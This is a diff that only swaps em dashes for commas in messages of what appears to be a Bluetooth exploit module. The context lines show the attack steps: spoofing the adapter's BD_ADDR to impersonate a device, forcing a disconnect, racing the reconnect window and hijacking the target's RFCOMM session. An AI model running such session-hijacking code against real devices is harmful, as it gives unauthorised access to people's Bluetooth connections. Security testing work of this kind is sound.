@@ -34,7 +34,7 @@ def _hci_write_bd_addr(adapter: str, addr: str) -> bool:
     """Write a new BD_ADDR to the adapter using bdaddr tool (bluez-utils-extra)."""
     r = _run(["which", "bdaddr"])
     if r.returncode != 0:
-        print_warning("bdaddr tool not found — skipping BD_ADDR spoof (install bluez-utils-extra)")
+        print_warning("bdaddr tool not found, skipping BD_ADDR spoof (install bluez-utils-extra)")
         return False
     r = _run(["bdaddr", "-i", adapter, addr])
     return r.returncode == 0
@@ -270,7 +270,7 @@ class Module(ExploitModule):
                 print_success(f"BD_ADDR spoofed to {impersonate}")
                 _reset_adapter(adapter)
             else:
-                print_warning("BD_ADDR spoof skipped — continuing without it")
+                print_warning("BD_ADDR spoof skipped, continuing without it")
         else:
             print_info("\n[2/4] Skipping BD_ADDR spoof (spoof_addr=false)")
 
@@ -279,7 +279,7 @@ class Module(ExploitModule):
         _disconnect_device(target)
         if evict_delay > 0:
             time.sleep(evict_delay)
-        print_success("Disconnect sent — racing reconnect window")
+        print_success("Disconnect sent, racing reconnect window")
 
         # Step 4: Hijack the RFCOMM session
         print_info(f"\n[4/4] Connecting to {target} RFCOMM channel {channel}...")
@@ -294,7 +294,7 @@ class Module(ExploitModule):
             hijacked = True
         else:
             print_error(
-                "Could not establish RFCOMM session — "
+                "Could not establish RFCOMM session, "
                 "timing window missed or target re-paired"
             )
             hijacked = False
